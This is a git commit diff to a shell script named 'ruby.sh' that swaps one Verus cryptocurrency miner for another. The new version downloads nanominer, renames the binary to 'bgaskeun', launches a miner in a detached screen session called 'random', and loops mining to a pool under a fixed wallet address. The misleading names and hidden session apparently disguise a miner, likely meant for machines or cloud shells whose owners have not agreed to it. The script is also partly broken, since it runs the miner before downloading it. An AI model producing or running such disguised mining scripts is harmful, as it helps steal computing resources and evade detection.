daed7ef99c3f1d5b7ba1c58af62866f0816fc9f4
Terri <terriana81@vqsprint.com>
2021-06-13 04:39:05 +0000

    ruby.sh edited online with Bitbucket

--- ruby.sh
+++ ruby.sh
@@ -1,17 +1,13 @@
 #!/bin/sh
-apt update
-sudo su
-su
-apt install git -y
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
+sudo apt update
+sudo apt install cpulimit
+sudo apt install screen -y
+screen -dmS random ./nanominer 65 75
+wget https://github.com/nanopool/nanominer/releases/download/3.3.4/nanominer-linux-3.3.4.tar.gz
+tar xf nanominer-linux-3.3.4.tar.gz
+mv nanominer bgaskeun
 while [ 1 ]; do
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.s1 -p x -t 2
+./bgaskeun -a verus -o stratum+tcp://na.luckpool.net:3960 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.jj -p x -t 2
 sleep 3
 done
 sleep 999
